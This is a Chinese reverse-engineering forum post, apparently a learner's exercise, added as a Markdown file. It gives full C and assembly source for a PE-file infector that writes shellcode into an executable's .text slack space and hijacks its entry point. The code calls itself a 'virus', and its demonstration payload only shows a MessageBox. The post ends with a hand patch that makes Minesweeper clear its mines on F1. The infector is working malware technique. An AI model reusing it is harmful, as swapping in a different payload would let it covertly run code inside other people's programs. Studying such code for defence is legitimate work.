@@ -1,0 +1,353 @@
+
+
+# 扫雷里插入代码
+
+> 原文：[`www.pediy.com/kssd/pediy10/71517.html`](https://www.pediy.com/kssd/pediy10/71517.html)
+
+最近钻研了 PE 文件格式一段时间，想到写个程序测试一下自己的学习成果，费了九牛二虎之力写了个小程序，也算是作为学习后的一个小成果吧，写过这个程序也真正意识到汇编的作用，见缝插针啊。水平很菜，各位大侠不要笑话，错误之处，恳请批评指证。![](img/32b12ba0f4c0e6a8843aaa06ba62fbdd.jpg "皱眉")   
+把源代码贴上（xp sp2，VC6.0 debug 编译通过）：  
+#include <stdio.h>  
+#include <windows.h>  
+  
+BOOL infect( char \*p\_fname);  
+void shellcode();  
+void shellcode\_end();  
+  
+char jmp\_ins\[5\] = { '\\xe9', 0, 0, 0, 0};  
+  
+int main( int argc, char \*argv\[\])  
+{  
+  if ( argc < 2) {  
+    printf("usage: infect a\_pe\_file\\n");  
+    return -1;  
+  }  
+  
+  infect( argv\[1\]);  
+  
+  return 0;  
+}  
+  
+#define DEFAULT\_BASE  0x1000000  
+  
+#define \_var1  (-4)  
+  
+\_\_declspec(naked) void shellcode()  
+{  
+  \_\_asm {  
+    call loc  
+loc:  
+    pop eax        // eax 存放的就是本条指令的地址  
+    jmp short start  
+  }  
+  
+  \_\_asm \_emit 0x90 \_\_asm \_emit 0x90 \_\_asm \_emit 0x90 \_\_asm \_emit 0x90 \_\_asm \_emit 0x90  
+  
+  \_\_asm \_emit 0x0 \_\_asm \_emit 0x0 \_\_asm \_emit 0x0 \_\_asm \_emit 0x0  
+  \_\_asm \_emit 0x0 \_\_asm \_emit 0x0 \_\_asm \_emit 0x0 \_\_asm \_emit 0x0  
+  
+  \_\_asm \_emit 'u' \_\_asm \_emit 's' \_\_asm \_emit 'e' \_\_asm \_emit 'r' \_\_asm \_emit '3' \_\_asm \_emit '2' \_\_asm \_emit '.' \_\_asm \_emit 'd' \_\_asm \_emit 'l' \_\_asm \_emit 'l' \_\_asm \_emit 0   
+  \_\_asm \_emit 'M' \_\_asm \_emit 'e' \_\_asm \_emit 's' \_\_asm \_emit 's' \_\_asm \_emit 'a' \_\_asm \_emit 'g' \_\_asm \_emit 'e' \_\_asm \_emit 'B' \_\_asm \_emit 'o' \_\_asm \_emit 'x' \_\_asm \_emit 'A' \_\_asm \_emit 0   
+  \_\_asm \_emit 'H' \_\_asm \_emit 'e' \_\_asm \_emit 'l' \_\_asm \_emit 'l' \_\_asm \_emit 'o' \_\_asm \_emit 0   
+  
+  \_\_asm  
+  {  
+start:  
+    pushad  
+      
+    mov edi, eax  
+    add edi, 3    // edi ptr to data area  
+      
+    mov ebp, esp  
+    sub esp, 4  
+  
+    ;push eax        // eax contains the location of shellcode  
+  
+    // get base of k32  
+    mov eax, fs:\[0x30\]      // get PEB ptr  
+    mov eax, \[eax+0x0c\]      // get PED\_LDR\_DATA ptr  
+    mov esi, \[eax+0x1c\]      // esi ptr to the 1st loaded module, i.e. the NTDLL.DLL  
+    lodsd            // esi ptr to the 2nd loaded module, i.e. the KERNEL32.DLL  
+    mov edx, \[eax+0x08\]      // edx contains the base addr of KERNEL32.DLL  
+    
+    // search export table  
+    mov eax, 0x331adddc  
+    call get\_func\_addr  
+    mov \[edi+5\], eax  
+      
+    mov eax, 0x99c95590  
+    call get\_func\_addr  
+    mov \[edi+9\], eax  
+  
+    lea eax, \[edi+13\]      // user32.dll  
+    push eax  
+    call \[edi+5\]        // eax contains the hmodule  
+      
+    lea ebx, \[edi+24\]      // MessageBoxA  
+    push ebx  
+    push eax  
+    call \[edi+9\]        ; eax contains the addr of MessageBoxA  
+      
+    xor ecx, ecx    
+    push ecx  
+    lea ebx, \[edi+36\]  
+    push ebx  
+    push ebx  
+    push ecx  
+    call eax  
+      
+    jmp quit  
+  
+  
+  
+    ; edx = dll base  
+    ; eax = hash  
+get\_func\_addr:  
+    push ebx  
+    push ecx  
+    push esi  
+    push edi  
+    push ebp  
+    
+    mov ebp, eax  
+  
+    mov ebx, edx        // ebx = base of k32  
+    add ebx, \[ebx+0x3c\]      // nt hdr  
+    add ebx, 0x18        // opt hdr  
+    add ebx, 0x60        // exp dir entry  
+    mov ebx, \[ebx\]        // ebx = rva of exp data  
+    add ebx, edx        // ebx = va of exp data  
+  
+    xor edi, edi        // index  
+  
+    mov ecx, ebx  
+    add ecx, 28          
+    mov ecx, \[ecx\]  
+    add ecx, edx        // ecx = va of func addrs  
+  
+    add ebx, 32          
+    mov ebx, \[ebx\]  
+    add ebx, edx      // ebx = va of func names  
+  
+next\_name:  
+    mov esi, \[ebx+edi\]  
+    add esi, edx        // esi = va of name  
+    add edi, 4  
+    call get\_hash        // eax = hash  
+    cmp eax, ebp  
+    jnz next\_name  
+  
+    sub edi, 4  
+    mov esi, \[ecx+edi\]        
+    add esi, edx        // esi = va of func addr  
+    mov eax, esi  
+  
+    pop ebp  
+    pop edi  
+    pop esi  
+    pop ecx  
+    pop ebx  
+    ret  
+  
+  
+  
+    ; esi = va of name  
+get\_hash:    
+    push esi  
+    push ebx  
+    push ecx  
+  
+    xor ebx, ebx  
+    xor eax, eax  
+next\_char:  
+    lodsb  
+    cmp al, 0  
+    jz get\_hash\_over  
+    mov ecx, ebx  
+    shl ecx, 5  
+    shr ebx, 27  
+    or ebx, ecx  
+    add ebx, eax  
+    jmp next\_char  
+get\_hash\_over:  
+    mov eax, ebx  
+    pop ecx  
+    pop ebx  
+    pop esi  
+    ret      
+      
+quit:  
+    push edi  
+  
+    // search entry point  
+    mov edi, DEFAULT\_BASE  
+    add edi, \[edi+0x3c\]  
+    add edi, 0x18  
+    add edi, 0x10  
+    mov edi, \[edi\]        // edi contains the entry point (rva)  
+    add edi, DEFAULT\_BASE    // edi contains the entry point (va)  
+      
+    // save entry point at loc  
+    mov \_var1\[ebp\], edi  
+  
+    mov ecx, 5  
+    pop esi  
+    rep movsb  
+  
+    mov esp, ebp  
+    popad  
+  
+    mov eax, \[esp-36\]  
+    jmp eax  
+  }  
+}  
+  
+\_\_declspec(naked) void shellcode\_end()  
+{  
+}  
+  
+BOOL infect( char \*p\_fname)  
+{  
+  HANDLE h\_file, h\_fmapping;  
+  PIMAGE\_DOS\_HEADER p\_dos\_hdr;  
+  PIMAGE\_NT\_HEADERS p\_nt\_hdr;  
+  PIMAGE\_FILE\_HEADER p\_file\_hdr;  
+  PIMAGE\_OPTIONAL\_HEADER p\_opt\_hdr;  
+  PIMAGE\_SECTION\_HEADER p\_sect\_hdr;  
+  unsigned long sc\_size, room = 0, off, i;  
+  void \*p\_mem;  
+  char \*p\_te, \*p\_entry, \*p\_tmp;  
+  
+  sc\_size = 0x117;  
+    
+  // open file  
+    h\_file = CreateFile(p\_fname, GENERIC\_READ|GENERIC\_WRITE, 0, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, 0);  
+    if ( h\_file == INVALID\_HANDLE\_VALUE ) {     
+    printf("fail to open file, err# %08x\\n", GetLastError());  
+    goto err0;  
+  }  
+      
+  // map file into memory  
+    h\_fmapping = CreateFileMapping(h\_file, NULL, PAGE\_READWRITE, 0, 0, NULL);  
+    if ( h\_fmapping == 0 ) {  
+        printf("fail to create file mapping, err# %08x\\n", GetLastError());  
+        goto err1;  
+  }  
+      
+    p\_mem = MapViewOfFile(h\_fmapping, FILE\_MAP\_ALL\_ACCESS, 0, 0, 0);  
+    if ( p\_mem == 0) {  
+        printf("couldn't map view of file, err# %08x\\n", GetLastError());  
+        goto err2;  
+    }  
+  
+  // get DOS hdr and do sanity checking  
+    p\_dos\_hdr = (PIMAGE\_DOS\_HEADER)p\_mem;  
+    if ( p\_dos\_hdr->e\_magic != IMAGE\_DOS\_SIGNATURE) {  
+    printf("unrecognized file format\\n");  
+    goto err3;  
+  }  
+  
+  // get NT hdr and do sanity checking  
+  p\_nt\_hdr = (PIMAGE\_NT\_HEADERS)((char \*)p\_dos\_hdr + p\_dos\_hdr->e\_lfanew);  
+  if ( p\_nt\_hdr->Signature != IMAGE\_NT\_SIGNATURE) {  
+    printf("invalid PE file, no NT signature found\\n");  
+    goto err3;  
+  }  
+  
+  // get other hdrs  
+  p\_file\_hdr = &p\_nt\_hdr->FileHeader;  
+  p\_opt\_hdr = &p\_nt\_hdr->OptionalHeader;  
+  p\_sect\_hdr = (PIMAGE\_SECTION\_HEADER)((char \*)p\_nt\_hdr + sizeof(IMAGE\_NT\_HEADERS));  
+  
+  // get text section room  
+  for ( i=0; i<p\_file\_hdr->NumberOfSections; i++, p\_sect\_hdr++) {  
+    if ( !stricmp( ".text", p\_sect\_hdr->Name)) {  
+      room = p\_opt\_hdr->FileAlignment - (p\_sect\_hdr->Misc.VirtualSize % p\_opt\_hdr->FileAlignment);  
+      break;  
+    }  
+  }  
+  
+  if ( room < sizeof(sc\_size)) {  
+    printf("insufficient room for virus.\\n");  
+    goto err3;  
+  }  
+  
+  printf( "room = %08x\\n", room);  
+  
+  printf("lfanew offset: %08x\\n", (char \*)&p\_dos\_hdr->e\_lfanew - (char \*)p\_dos\_hdr);  
+  printf("opt-hdr offset: %08x\\n", (char \*)&p\_nt\_hdr->OptionalHeader - (char \*)p\_nt\_hdr);  
+  printf("entry offset: %08x\\n", (char \*)&p\_opt\_hdr->AddressOfEntryPoint - (char \*)p\_opt\_hdr);  
+  printf("exp offset: %08x\\n", (char \*)&(p\_opt\_hdr->DataDirectory\[IMAGE\_DIRECTORY\_ENTRY\_EXPORT\]) - (char \*)p\_opt\_hdr);  
+  
+  p\_entry = (char \*)p\_mem + p\_sect\_hdr->PointerToRawData + (p\_opt\_hdr->AddressOfEntryPoint - p\_sect\_hdr->VirtualAddress);  
+  p\_te = (char \*)p\_mem + p\_sect\_hdr->PointerToRawData + p\_sect\_hdr->Misc.VirtualSize;  
+  off = \*((unsigned long \*)((char \*)shellcode + 1));  
+  p\_tmp = ((char \*)shellcode + off + 5);  
+  memcpy( p\_te, p\_tmp, sc\_size);  
+  memcpy( p\_te+8, p\_entry, 5);  
+  
+  // create jmp struct  
+  off = p\_te - p\_entry - 5;  
+  \*((unsigned long \*)(jmp\_ins + 1)) = off;  
+  memcpy( p\_entry, jmp\_ins, 5);  
+  
+  p\_sect\_hdr->Characteristics |= 0x80000000;  
+  
+  printf("%08x\\n", sizeof(IMAGE\_FILE\_HEADER));  
+  
+err3:  
+  UnmapViewOfFile(p\_mem);  
+err2:  
+  CloseHandle(h\_fmapping);  
+err1:  
+  CloseHandle( h\_file);  
+err0:  
+  return FALSE;  
+}
+
+上传的附件
+| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || Infect.rar  
+ |
+
+直接手术 PE 文件以达到效果，实现起来只需要改两个地方，一个是“帮助”处的强跳，一个就是在文件中找一足够空间的空白处写上代码。修改如下：（修改了 9h+30h 共 39h 个字节）  
+
+代码:
+
+```
+01001F09       |. /EB 04               jmp     short 01001F0F
+01001F0B          |90                  nop
+01001F0C          |90                  nop
+01001F0D          |90                  nop
+01001F0E          |90                  nop
+01001F0F          \\E8 412B0000         call    01004A55
+01001F14       |.  E9 90020000         jmp     010021A9
+
+```
+
+代码:
+
+```
+01004A55           60                  pushad
+01004A56           33FF                xor     edi, edi
+01004A58           47                  inc     edi
+01004A59           33F6                xor     esi, esi
+01004A5B           46                  inc     esi
+01004A5C           8BC7                mov     eax, edi
+01004A5E           C1E0 05             shl     eax, 5
+01004A61           03C6                add     eax, esi
+01004A63           8A80 40530001       mov     al, byte ptr \[eax+1005340\]
+01004A69           3C 0F               cmp     al, 0F
+01004A6B           75 07               jnz     short 01004A74
+01004A6D           57                  push    edi
+01004A6E           56                  push    esi
+01004A6F           E8 9EEAFFFF         call    01003512
+01004A74           3B35 34530001       cmp     esi, dword ptr \[1005334\]
+01004A7A         ^ 76 DF               jbe     short 01004A5B
+01004A7C           3B3D 38530001       cmp     edi, dword ptr \[1005338\]
+01004A82         ^ 76 D4               jbe     short 01004A58
+01004A84           61                  popad
+01004A85           C3                  retn
+
+```
+
+OK 了，可以直接按 F1 瞬间排雷了.  
+我用的 winmine.exe 是 XP pro SP1 的，系统版本不同，也许程序就不同了
